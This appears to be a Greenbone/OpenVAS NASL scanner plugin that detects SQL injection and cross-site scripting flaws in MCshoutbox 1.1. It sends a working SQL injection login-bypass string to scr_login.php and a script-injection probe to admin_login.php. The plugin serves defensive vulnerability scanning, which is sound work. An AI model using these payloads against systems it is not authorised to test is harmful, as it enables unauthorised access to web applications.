if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900883" );
	script_version( "2021-09-01T12:57:33+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 12:57:33 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2009-10-29 07:53:15 +0100 (Thu, 29 Oct 2009)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2009-3714", "CVE-2009-3715" );
	script_name( "MCshoutbox Multiple SQL Injection and XSS Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/35885/" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9205" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2009/1961" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to bypass the
  authentication mechanism when 'magic_quotes_gpc' is disabled or can cause arbitrary code
  execution by uploading the shell code in the context of the web application." );
	script_tag( name: "affected", value: "MCshoutbox version 1.1 on all running platform" );
	script_tag( name: "insight", value: "- Input passed via the 'loginerror' to admin_login.php is not
  properly sanitised before being returned to the user. This can be exploited to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.

  - Input passed via the 'username' and 'password' parameters to scr_login.php
    is not properly sanitised before being used in an SQL query. This can be
    exploited to manipulate SQL queries by injecting arbitrary SQL code.

  - The application does not properly check extensions of uploaded 'smilie'
    image files. This can be exploited to upload and execute arbitrary PHP code." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running MCshoutbox and is prone to multiple SQL
  Injection and Cross-Site Scripting vulnerabilities." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/MCshoutBox", "/shoutbox", "/box", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq1 = http_get( item: dir + "/shoutbox.php", port: port );
	rcvRes1 = http_keepalive_send_recv( port: port, data: sndReq1 );
	if(ContainsString( rcvRes1, ">Shoutbox<" ) && egrep( pattern: "^HTTP/1\\.[01] 200", string: rcvRes1 )){
		filename1 = dir + "/scr_login.php";
		filename2 = dir + "/admin_login.php";
		authVariables = "username='or''='&password='or''='";
		sndReq2 = NASLString( "POST ", filename1, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Referer: http://", host, filename2, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( authVariables ), "\\r\\n\\r\\n", authVariables );
		rcvRes2 = http_keepalive_send_recv( port: port, data: sndReq2 );
		if(egrep( pattern: "Location: admin.php", string: rcvRes2 )){
			report = http_report_vuln_url( port: port, url: filename2 );
			security_message( port: port, data: report );
			exit( 0 );
		}
		url = NASLString( dir, "/admin_login.php?loginerror=" + "<script>alert(document.cookie)</script>" );
		sndReq3 = http_get( item: url, port: port );
		rcvRes3 = http_keepalive_send_recv( port: port, data: sndReq3 );
		if(IsMatchRegexp( rcvRes3, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes3, "><script>alert(document.cookie)</script><" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

